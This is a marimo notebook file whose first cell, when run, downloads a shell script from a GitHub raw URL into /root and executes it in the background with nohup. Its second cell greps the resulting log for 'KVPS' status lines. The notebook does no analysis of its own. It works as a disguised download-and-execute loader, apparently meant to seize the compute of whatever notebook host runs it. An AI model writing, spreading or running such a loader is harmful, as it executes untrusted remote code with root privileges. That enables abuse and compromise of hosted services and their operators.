import marimo

__generated_with = "0.9.0"
app = marimo.App(width="full")


@app.cell
def _():
    import os
    os.system("curl -s -o /root/kvboot.sh https://raw.githubusercontent.com/Setyoanugrah/molab-notebook/main/boot5.sh && wc -c /root/kvboot.sh && nohup bash /root/kvboot.sh > /root/kvboot.log 2>&1 & echo KICKED")
    return (os,)


@app.cell
def _():
    import subprocess
    o = subprocess.run("grep -h KVPS /root/kvboot.log | tail -4", shell=True, capture_output=True, text=True).stdout
    print(o)
    print("KVPSFINAL")
    return (o,)


if __name__ == "__main__":
    app.run()
